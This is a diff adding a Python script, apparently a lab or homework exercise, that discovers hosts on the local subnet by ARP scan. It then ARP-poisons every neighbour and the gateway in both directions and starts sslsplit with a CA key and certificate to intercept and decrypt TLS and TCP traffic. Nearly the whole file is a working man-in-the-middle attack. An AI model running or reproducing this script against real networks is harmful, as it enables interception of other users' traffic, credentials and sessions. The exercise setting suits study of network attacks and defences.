@@ -1,0 +1,70 @@
+#!/usr/bin/env python3
+
+from os import system, geteuid
+from sys import exit
+from math import log2
+import netifaces as ni
+from scapy.all import ARP, Ether, srp, send
+
+gw = None
+arp_table = {}
+
+
+def main():
+    if geteuid() != 0:
+        exit('Please run as root')
+    task1()
+    task2()
+    task3()
+
+
+def task1():
+    global gw, arp_table
+
+    """
+    gw = ('192.168.88.1', 'en0', True)
+    itf = {'addr': '192.168.88.248', netmask': '255.255.255.0',
+           'broadcast': '192.168.88.255'}
+    cidr = 32 - sum([0, 0, 0, 8]) = 24
+    net = '192.168.88.248/24'
+    """
+    gw = ni.gateways()[ni.AF_INET][0]
+    itf = ni.ifaddresses(gw[1])[ni.AF_INET][0]
+    cidr = 32 - sum([int(log2(256-int(i))) for i in itf['netmask'].split('.')])
+    net = itf['addr'] + '/' + str(cidr)
+
+    arp = ARP(pdst=net)
+    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+    results = srp(broadcast / arp, timeout=5, verbose=False)[0]
+
+    for sent, recv in results:
+        arp_table[recv.psrc] = recv.hwsrc
+
+    print('Available devices')
+    print('+-----------------+-------------------+')
+    print('| IP Address      | MAC Address       |')
+    print('+-----------------+-------------------+')
+    for key in arp_table:
+        print('| %-15s | %17s |' % (key, arp_table[key]))
+    print('+-----------------+-------------------+')
+
+
+def task2():
+    for neibr in arp_table:
+        if neibr == gw[0]:
+            continue
+
+        arp1 = ARP(op=2, hwdst=arp_table[gw[0]], pdst=gw[0], psrc=neibr)
+        arp2 = ARP(op=2, hwdst=arp_table[neibr], pdst=neibr, psrc=gw[0])
+        send(arp1)
+        send(arp2)
+
+
+def task3():
+    system('sudo sslsplit -D -l sslsplit-connections.log ' +
+           '-j sslsplit-jail/ -S sslsplit-log -k ca.key -c ca.crt ' +
+           'ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
+
+
+if __name__ == '__main__':
+    main()
